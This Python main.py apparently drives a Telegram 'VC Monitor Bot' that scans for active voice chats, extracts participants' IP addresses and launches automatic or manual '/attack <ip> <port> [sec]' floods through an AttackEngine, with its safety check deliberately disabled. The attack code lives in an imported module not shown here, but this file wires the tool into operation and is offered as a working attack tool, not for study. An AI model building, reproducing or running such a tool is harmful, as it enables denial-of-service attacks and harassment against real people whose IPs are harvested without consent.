"""Fixed main.py — auto reconnect, crash recovery."""

from __future__ import annotations

import asyncio
import logging
import sys

from pyrogram import Client, enums, idle

from attack_engine import AttackEngine
from bot_handler import BotHandler
from config import Config
from vc_detector import VCDetector


def setup_logging(log_file: str) -> None:
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(levelname)s [%(name)s] %(message)s",
        handlers=[
            logging.StreamHandler(sys.stdout),
            logging.FileHandler(log_file, encoding="utf-8")
        ],
    )
    logging.getLogger("pyrogram").setLevel(logging.WARNING)

    LOGGER = logging.getLogger(__name__)
    LOGGER.info("=" * 50)
    LOGGER.info("VC Monitor Bot — Fixed v2")
    LOGGER.info("=" * 50)


async def run() -> int:
    try:
        cfg = Config.from_env()
    except ValueError as e:
        print(f"Config Error: {e}")
        print("\nRequired env vars: API_ID, API_HASH, BOT_TOKEN, SESSION_STRING")
        return 1

    setup_logging(cfg.log_file)
    LOGGER = logging.getLogger(__name__)

    LOGGER.info("Clients initialize ho rahe hain...")

    bot = Client(
        "vc_bot_fixed",
        api_id=cfg.api_id,
        api_hash=cfg.api_hash,
        bot_token=cfg.bot_token
    )

    user = Client(
        "vc_user_fixed",
        api_id=cfg.api_id,
        api_hash=cfg.api_hash,
        session_string=cfg.session_string
    )

    engine = AttackEngine(
        max_threads=cfg.max_threads,
        max_duration=cfg.max_duration,
        safety_check=False
    )

    LOGGER.info("Bot client start...")
    try:
        await bot.start()
    except Exception as exc:
        LOGGER.error("Bot start fail: %s", exc)
        return 1

    LOGGER.info("User client start...")
    try:
        await user.start()
    except Exception as exc:
        LOGGER.error("User client start fail: %s", exc)
        LOGGER.error("SESSION_STRING check karo — pyrogram session string hona chahiye")
        await bot.stop()
        return 1

    detector = VCDetector(
        user_client=user,
        scan_cooldown_seconds=cfg.scan_cooldown_seconds
    )

    handler = BotHandler(
        bot=bot,
        detector=detector,
        engine=engine,
        admin_id=cfg.admin_id,
        max_duration=cfg.max_duration,
        scan_limit=cfg.scan_limit,
    )
    handler.register_handlers()

    # Startup message
    startup_msg = (
        "✅ <b>VC Monitor Bot v2 — Online!</b>\n\n"
        "<b>Commands:</b>\n"
        "/scan — Active VCs dhundho\n"
        "/attack &lt;ip&gt; &lt;port&gt; [sec] — Manual attack\n"
        "/status — Current state dekho\n"
        "/stop — Sab band karo\n\n"
        "<b>Flow:</b>\n"
        "1. /scan → VC select → PROCEED\n"
        "2. IP extract → AUTO ATTACK\n"
        "3. /stop se kabhi bhi band karo"
    )

    try:
        target = cfg.admin_id if cfg.admin_id else "me"
        await bot.send_message(target, startup_msg, parse_mode=enums.ParseMode.HTML)
        LOGGER.info("Startup message bheja")
    except Exception as e:
        LOGGER.warning("Startup message fail: %s", e)

    LOGGER.info("Bot chal raha hai. Ctrl+C se band karo.")

    try:
        await idle()
    except KeyboardInterrupt:
        LOGGER.info("Ctrl+C — band ho raha hai")
    finally:
        LOGGER.info("Cleanup...")
        engine.stop()

        try:
            await user.stop()
            LOGGER.info("User client band")
        except Exception as e:
            LOGGER.error("User stop error: %s", e)

        try:
            await bot.stop()
            LOGGER.info("Bot client band")
        except Exception as e:
            LOGGER.error("Bot stop error: %s", e)

        LOGGER.info("Done.")

    return 0


def main() -> None:
    if sys.platform.startswith("linux"):
        try:
            import uvloop
            asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
            print("✓ uvloop active")
        except ImportError:
            pass

    try:
        exit_code = asyncio.run(run())
        raise SystemExit(exit_code)
    except SystemExit:
        raise
    except Exception as e:
        print(f"Fatal: {e}")
        import traceback
        traceback.print_exc()
        raise SystemExit(1)


if __name__ == "__main__":
    main()
